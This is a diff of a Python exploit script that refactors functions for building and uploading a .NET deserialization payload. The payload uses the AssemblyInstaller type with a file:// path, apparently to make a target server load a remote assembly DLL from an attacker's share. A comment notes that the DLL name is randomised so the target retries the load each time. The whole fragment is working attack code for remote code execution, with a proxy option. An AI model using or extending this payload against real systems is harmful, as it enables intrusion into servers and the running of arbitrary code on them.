@@ -350,28 +350,31 @@ def mode_encrypt_custom_Payload():
 def mode_send_custom_Payload(proxy = False):
     print(upload(custom_payload(sys.argv[2], sys.argv[3]), sys.argv[4], proxy))    
 
-
 def mode_send_custom_Payload_proxy(): 
     mode_send_custom_Payload(sys.argv[5])
 
+def gen_remote_payload(path):
+    return [
+        '{"Path":"file:////' + path + '"}', 
+        'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+    ]
+
+def upload_remote_payload(payload, proxy):
+    print(upload(custom_payload(payload[0], payload[1]), sys.argv[3], proxy))
+
 def mode_test_remote_Payload(proxy = False):
-	print(upload(
-		custom_payload(  # filename is randomised to workaround the caching of failure to load assembly - ensures the target will re-attempt each time
-			'{"Path":"file:////' + sys.argv[2] + '/share/mixed_mode_assembly_' + str(uuid.uuid1()) + '.dll"}', 
-			'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
-		), sys.argv[3], proxy)
-	)
+    payload = gen_remote_payload( 
+    # filename is randomised to workaround the caching of failure to load assembly - ensures the target will re-attempt each time
+        sys.argv[2] + '/share/mixed_mode_assembly_' + str(uuid.uuid1()) + '.dll'
+    )
+    upload_remote_payload(payload, proxy)
 
 def mode_test_remote_Payload_proxy():
-	mode_test_remote_Payload(sys.argv[4])
+    mode_test_remote_Payload(sys.argv[4])
 
 def mode_load_remote_Payload(proxy = False):
-    print(upload(
-        custom_payload(
-            '{"Path":"file:////' + sys.argv[2] + '"}', 
-            'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
-        ), sys.argv[3], proxy)
-    )
+    payload = gen_remote_payload(sys.argv[2])
+    upload_remote_payload(payload, proxy)
 
 def mode_load_remote_Payload_proxy():
     mode_load_remote_Payload(sys.argv[4])
